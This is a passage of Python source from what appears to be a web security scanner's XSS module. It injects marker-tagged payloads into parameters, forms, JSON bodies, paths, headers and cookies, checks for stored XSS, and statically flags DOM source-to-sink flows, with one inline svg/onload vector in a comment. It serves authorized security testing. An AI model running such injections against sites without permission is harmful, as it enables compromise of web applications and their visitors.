        candidates.sort(key=lambda p: (0 if p.kind in ("script", "handler", "js_source",
                                                       "js_breakout") else 1, p.sev != "High"))
        tried = 0
        for p in candidates[: self.payload_limit]:
            sent = p.build(marker)
            r = sender(sent)
            self.payloads_sent += 1
            tried += 1
            v = self._verify(r, marker, p.kind, sent)
            if v:
                sev, ctx_label, evidence = v
                self.confirmed.add(key)
                self._found(f"{sev} Executable XSS [{point}] via {p.kind} "
                            f"in {ctx_label} -> {url}")
                self._add(vuln_type=f"Reflected XSS (executable — {p.kind})",
                          severity=sev, url=url, parameter=point, payload=sent,
                          evidence=evidence + (f" | note: {p.note}" if p.note else ""),
                          detail=f"Reflection context: {', '.join(sorted(labels))}. "
                                 f"Verified by re-parsing the response: the injected "
                                 f"marker reached an executable context.",
                          cvss_hint=8.1 if sev == "High" else 6.1)
                return True

        # 3) optional brute tier from the vendored PayloadsAllTheThings lists.
        #    Every vector is rewritten to carry OUR marker, so it is verified
        #    exactly like a curated payload — breadth without false positives.
        if self.brute and key not in self.confirmed:
            skipped = 0
            for raw in community_payloads(self.brute_limit):
                sent, tagged = embed_marker(raw, marker)
                if not tagged:
                    skipped += 1          # cannot be verified -> never reported
                    continue
                r = sender(sent)
                self.payloads_sent += 1
                if r is None or marker not in (r.text or ""):
                    continue
                v = self._verify(r, marker, "community", sent)
                if v:
                    sev, ctx_label, evidence = v
                    self.confirmed.add(key)
                    self._found(f"{sev} Executable XSS [{point}] via community "
                                f"vector in {ctx_label} -> {url}")
                    self._add(vuln_type="Reflected XSS (executable — community vector)",
                              severity=sev, url=url, parameter=point,
                              payload=sent[:300],
                              evidence=evidence + " | vector from the vendored "
                                                  "PayloadsAllTheThings lists (MIT)",
                              detail=f"Reflection context: {', '.join(sorted(labels))}.",
                              cvss_hint=8.1)
                    return True
            if skipped:
                self._log(f"[*] brute tier: {skipped} vector(s) skipped — they "
                          f"cannot carry a verifiable marker")

        # Header / cookie / path reflections that do not execute are noise in
        # a professional report (every site echoes User-Agent). Keep them off
        # the finding list; query/form inert reflections stay as a single Low.
        if not (where.startswith("header:") or where.startswith("cookie:")
                or where.startswith("path-")):
            self._inert(resp, marker, url, point, where, labels)
        return False

    # -- injection point drivers ------------------------------------------
    def run_params(self) -> None:
        for url, params in list(self.state.params.items()):
            names = sorted(params)
            if not names:
                continue
            self._info(f"Deep XSS on {url} params={names}")
            parsed = urllib.parse.urlsplit(url)
            clean = urllib.parse.urlunsplit(
                (parsed.scheme, parsed.netloc, parsed.path, "", ""))
            base = {p: "1" for p in names}
            for p in names:
                def sender(value, _p=p, _base=base, _clean=clean):
                    params_ = dict(_base)
                    params_[_p] = value
                    return self._send("GET", _clean, params=params_)
                self.attack_point(clean, p, sender, f"query:{p}@{clean}")

    def run_forms(self) -> None:
        for form in self.state.forms:
            names = [i["name"] for i in form.get("inputs", []) if i.get("name")
                     and i.get("type") not in ("submit", "button", "image",
                                               "file", "reset")]
            if not names:
                continue
            furl = form.get("url") or self.state.base_url
            method = (form.get("method") or "GET").upper()
            self._info(f"Deep XSS on form {furl} ({method}) fields={names}")
            base = {n: "test" for n in names}
            for n in names:
                def sender(value, _n=n, _base=base, _m=method, _u=furl):
                    data = dict(_base)
                    data[_n] = value
                    if _m == "GET":
                        return self._send("GET", _u, params=data)
                    return self._send("POST", _u, data=data)
                self.attack_point(furl, n, sender, f"form:{n}@{furl}")

                # same field, but as a JSON body (SPA/API endpoints)
                def jsender(value, _n=n, _base=base, _u=furl):
                    data = dict(_base)
                    data[_n] = value
                    return self._send("POST", _u, json=data,
                                      headers={"Content-Type": "application/json"})
                self.attack_point(furl, n + " (JSON body)", jsender,
                                  f"json:{n}@{furl}")

    def run_paths(self) -> None:
        urls = list(self.state.crawled_urls)[:20] or [self.state.base_url]
        for url in urls:
            parsed = urllib.parse.urlsplit(url)
            base = urllib.parse.urlunsplit(
                (parsed.scheme, parsed.netloc, "", "", ""))
            segs = [s for s in parsed.path.split("/") if s]

            def sender_seg(value, _b=base, _s=segs):
                path = "/" + "/".join(_s + [value])
                return self._send("GET", _b + path)
            self.attack_point(base + parsed.path, "path segment (appended)",
                              sender_seg, f"path-append@{base}{parsed.path}")

            if segs:
                def sender_last(value, _b=base, _s=segs):
                    path = "/" + "/".join(_s[:-1] + [value])
                    return self._send("GET", _b + path)
                self.attack_point(base + parsed.path, "path segment (last)",
                                  sender_last, f"path-last@{base}{parsed.path}")

            def sender_root(value, _b=base):
                return self._send("GET", _b + "/" + value)
            self.attack_point(base, "path segment (root)", sender_root,
                              f"path-root@{base}")

    def run_headers(self) -> None:
        if not self.test_headers:
            return
        urls = [self.state.base_url] + list(self.state.crawled_urls)[:3]
        for url in urls:
            host = urllib.parse.urlsplit(url).netloc or "localhost"
            self._info(f"Deep XSS via HTTP headers on {url}")
            for hname, tpl in HEADER_VECTORS:
                def sender(value, _h=hname, _u=url):
                    return self._send("GET", _u, headers={_h: value})
                self.attack_point(url, f"header {hname}", sender,
                                  f"header:{hname}@{url}")
            cname, ctpl = COOKIE_VECTOR

            def csend(value, _u=url, _c=cname):
                return self._send("GET", _u, cookies={_c: value})
            self.attack_point(url, f"cookie {cname}", csend, f"cookie:{cname}@{url}")

    # -- stored / blind sweep ---------------------------------------------
    def run_stored_sweep(self) -> None:
        if not self.stored_sweep or not self.markers:
            return
        pages = [self.state.base_url] + list(self.state.crawled_urls)
        pages = list(dict.fromkeys(pages))[:40]
        self._info(f"Stored/blind XSS sweep: looking for {len(self.markers)} "
                   f"marker(s) across {len(pages)} page(s)")
        hits = 0
        inert_once: set = set()
        # Header echoes are not "stored XSS". Only form/query/json markers
        # that reappear on another page count as persistence.
        persistable = [(m, w) for m, w in self.markers
                       if w.startswith(("query:", "form:", "json:"))]
        for page in pages:
            resp = self._send("GET", page)
            if resp is None:
                continue
            body = resp.text or ""
            for marker, where in persistable:
                if marker not in body:
                    continue
                if where.endswith("@" + page):
                    continue
                v = self._verify(resp, marker, "stored", marker)
                if v:
                    sev, ctx_label, evidence = v
                    hits += 1
                    self._found(f"Critical STORED XSS from [{where}] appears on {page}")
                    self._add(vuln_type="Stored (persistent) XSS — executable",
                              severity="Critical", url=page,
                              parameter=where, payload=marker,
                              evidence=f"{evidence}; injected at {where} and later "
                                       f"found rendered on {page}",
                              detail="Input submitted earlier is now served to "
                                     "other visitors in an executable context — "
                                     "this is persistent XSS (session theft, "
                                     "worms, defacement).",
                              cvss_hint=9.6)
                elif where not in inert_once and len(inert_once) < 8:
                    inert_once.add(where)
                    self._add(vuln_type="Stored input reflected without execution",
                              severity="Low", url=page, parameter=where,
                              payload=marker,
                              evidence=f"marker from {where} persisted on {page} "
                                       f"but no executable context was reached",
                              detail="Data is stored and re-served. Verify manually "
                                     "in a browser: sanitisation may differ per "
                                     "output location.",
                              cvss_hint=3.1)
        if not hits:
            self._log(f"[*] Stored sweep: no executable persistence found "
                      f"({len(persistable)} persistable marker(s) checked)")

    # -- DOM XSS static analysis ------------------------------------------
    def run_dom_analysis(self) -> None:
        if not self.dom_analysis:
            return
        base = self.state.base_url
        js_urls: List[str] = []
        inline: List[Tuple[str, str]] = []
        for page in [base] + list(self.state.crawled_urls)[:12]:
            resp = self._send("GET", page)
            if resp is None:
                continue
            body = resp.text or ""
            for src in re.findall(r"<script[^>]+src=[\"']([^\"']+)[\"']", body, re.I):
                absu = urllib.parse.urljoin(resp.url, src)
                if _same_host(base, absu) and absu not in js_urls:
                    js_urls.append(absu)
            for block in re.findall(r"<script[^>]*>(.*?)</script>", body, re.I | re.S):
                if block.strip():
                    inline.append((page, block))
        js_urls = js_urls[: self.max_js_files]
        self._info(f"DOM XSS static analysis: {len(js_urls)} external JS file(s), "
                   f"{len(inline)} inline block(s)")
        sources_seen: Dict[str, List[str]] = {}
        checked = 0
        for u in js_urls:
            resp = self.client.get(u)
            checked += 1
            if resp is None:
                continue
            self._analyze_js(u, resp.text or "", sources_seen)
        for page, block in inline[:40]:
            self._analyze_js(f"{page} (inline script)", block, sources_seen)
        if not sources_seen:
            self._log(f"[*] DOM analysis: no source→sink flow found "
                      f"({checked} file(s) parsed)")

    def _analyze_js(self, where: str, code: str, sink_hits: Dict[str, List[str]]) -> None:
        if not code:
            return
        srcs = [label for rx, label in DOM_SOURCES if re.search(rx, code)]
        if not srcs:
            return
        sinks = [label for rx, label in DOM_SINKS if re.search(rx, code)]
        if not sinks:
            return
        sanitized = [s for s in DOM_SANITIZERS if re.search(s, code, re.I)]
        if sanitized:
            sev, note = "Info", ("sanitisation/encoding helpers are present in the "
                                 "same script (" + ", ".join(sanitized[:3]) + ") — "
                                 "manual review needed")
        else:
            sev, note = "Medium", ("no sanitiser (DOMPurify/textContent/encodeURI…) "
                                   "was found in the same script")
        key = where.split("?")[0]
        if key in sink_hits:
            return
        sink_hits[key] = srcs
        evidence = f"sources: {', '.join(srcs[:4])} | sinks: {', '.join(sinks[:4])}"
        line = ""
        for rx, label in DOM_SINKS:
            m = re.search(rx, code)
            if m:
                s = max(0, m.start() - 40)
                line = code[s:m.end() + 60].replace("\n", " ").strip()
                break
        self._add(vuln_type="Potential DOM-based XSS (static source→sink flow)",
                  severity=sev, url=where, parameter="JavaScript",
                  payload="(static analysis — no payload sent)",
                  evidence=evidence + (f" | code: {line[:120]}" if line else ""),
                  detail=note + ". DOM XSS executes entirely in the browser, so a "
                                "server-side scanner can only flag the flow — "
                                "confirm with the hash/fragment vector "
                                "(#<svg/onload=…>) in a browser.",
                  cvss_hint=5.4 if sev == "Medium" else 0.0)

    # -- entry point -------------------------------------------------------
    def run(self) -> None:
        t0 = time.time()
        self._info(f"Deep XSS engine: {len(PAYLOAD_LIBRARY)} curated payloads "
                   f"per context (limit {self.payload_limit}/context)"
                   + (f" + {self.brute_limit} community vectors" if self.brute else ""))
        self.run_params()
        self.run_forms()
        self.run_paths()
        self.run_headers()
        if self.dom_analysis:
            self.run_dom_analysis()
        if self.stored_sweep:
            self.run_stored_sweep()
        self._log(f"[+] Deep XSS done in {round(time.time() - t0, 1)}s | "
                  f"{self.probes_sent} probes, {self.payloads_sent} payloads, "
                  f"{len(self.markers)} markers planted | contexts seen: "
                  f"{self.contexts_seen or 'none'}")

    def stats(self) -> Dict[str, Any]:
        return {"probes_sent": self.probes_sent,
                "payloads_sent": self.payloads_sent,
                "markers_planted": len(self.markers),
                "contexts_seen": dict(self.contexts_seen),
                "confirmed_points": sorted(f"{u} [{p}]" for u, p in self.confirmed)}


def classify_json_context_label(ctx: str) -> str:
    return CTX_JSON


def _same_host(a: str, b: str) -> bool:
    ha = (urllib.parse.urlsplit(a).netloc or "").lower().split(":")[0]
    hb = (urllib.parse.urlsplit(b).netloc or "").lower().split(":")[0]
    if ha.startswith("www."):
        ha = ha[4:]
    if hb.startswith("www."):
        hb = hb[4:]
    return bool(ha) and ha == hb
